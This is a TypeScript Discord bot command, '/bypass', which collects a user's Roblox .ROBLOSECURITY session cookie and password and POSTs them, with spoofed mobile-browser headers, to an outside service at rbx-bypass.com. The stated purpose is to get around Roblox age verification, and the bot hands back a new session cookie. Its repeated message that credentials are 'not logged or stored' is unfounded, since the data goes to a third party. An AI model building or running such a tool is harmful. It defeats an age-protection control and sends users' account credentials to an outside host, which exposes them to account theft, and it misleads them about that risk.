import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
} from 'discord.js';
import axios from 'axios';
import type { Command } from './types';

const bypassStore = new Map<string, string>();

function buildInitialButtons(id: string): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`bypass_copypc_${id}`)
      .setLabel('💻 Copy PC')
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`bypass_copymob_${id}`)
      .setLabel('📱 Copy Mobile')
      .setStyle(ButtonStyle.Secondary),
  );
}

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Attempt to bypass age verification using external API')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie')
      .setDescription('The .ROBLOSECURITY cookie')
      .setRequired(true)
  )
  .addStringOption(opt =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ ephemeral: true });

  const cookie = interaction.options.getString('cookie', true);
  const password = interaction.options.getString('password', true);
  const timestamp = new Date().toLocaleString();
  const footerData = {
    text: `${interaction.user.username} | ${timestamp}`,
    iconURL: interaction.user.displayAvatarURL(),
  };

  const progressEmbed = new EmbedBuilder()
    .setTitle('𖣐 Processing .ᐟ')
    .setColor('#FFFFFF')
    .setDescription(
      `✧ **Status:** Sending bypass request...\n` +
      `────\n` +
      `⭑ Contacting external bypass service.\n` +
      `⭑ Your credentials are not logged or stored.`
    )
    .setFooter(footerData);

  await interaction.editReply({ embeds: [progressEmbed] });

  try {
    const url = 'https://rbx-bypass.com/api/public/bypass';
    const headers = {
      'authority': 'rbx-bypass.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7',
      'content-type': 'application/json',
      'origin': 'https://rbx-bypass.com',
      'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    };
    const payload = { cookie, password };

    const resp = await axios.post(url, payload, { headers, timeout: 15000, validateStatus: () => true });
    const data = resp.data;

    if (data.success === true) {
      const msg = data.message || 'No additional info.';
      const newCookie = data.cookie || null;
      let id = '';
      if (newCookie) {
        id = Math.random().toString(36).slice(2, 10);
        bypassStore.set(id, newCookie);
        setTimeout(() => bypassStore.delete(id), 60000);
      }

      const embed = new EmbedBuilder()
        .setTitle('𖣐 Success .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **Bypass Result**\n` +
          `────\n` +
          `⭑ **Status:** Success\n` +
          `⭑ **Message:** ${msg}\n` +
          (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
          `────\n` +
          `✧ **Details**\n` +
          `────\n` +
          `⭑ **Action:** Age verification bypass attempted.\n` +
          `⭑ Your credentials were not logged or stored.`
        )
        .setFooter(footerData);

      const components = newCookie ? [buildInitialButtons(id)] : [];
      await interaction.editReply({ embeds: [embed], components });
    } else if (data.error === 'BYPASS_IN_PROGRESS') {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Processing .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **Status:** Waiting\n` +
          `────\n` +
          `⭑ Your account is being processed.\n` +
          `⭑ Please wait a few minutes and try again.\n` +
          `⭑ Your credentials were not logged or stored.`
        )
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
    } else {
      const reason = data.message || data.error || 'Unknown error';
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Failed .ᐟ')
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **Error Occurred**\n` +
          `────\n` +
          `⭑ **Reason:** ${reason}\n` +
          `⭑ The bypass request was rejected or failed.\n` +
          `⭑ Your credentials were not logged or stored.`
        )
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
    }
  } catch (error: any) {
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Failed .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        `✧ **Error Occurred**\n` +
        `────\n` +
        `⭑ **Reason:** ${error.message || 'Network error'}\n` +
        `⭑ The request could not be completed.\n` +
        `⭑ Your credentials were not logged or stored.`
      )
      .setFooter(footerData);
    await interaction.editReply({ embeds: [embed] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  const customId = interaction.customId;
  if (!customId.startsWith('bypass_')) return;

  const parts = customId.split('_');
  const action = parts[1];
  const id = parts[2];

  const cookie = bypassStore.get(id);
  if (!cookie) {
    await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
    return;
  }

  if (action === 'copypc') {
    await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
  } else if (action === 'copymob') {
    await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
  }
}

export const bypassCommand: Command = { data, execute, handleButton };
export { buildInitialButtons };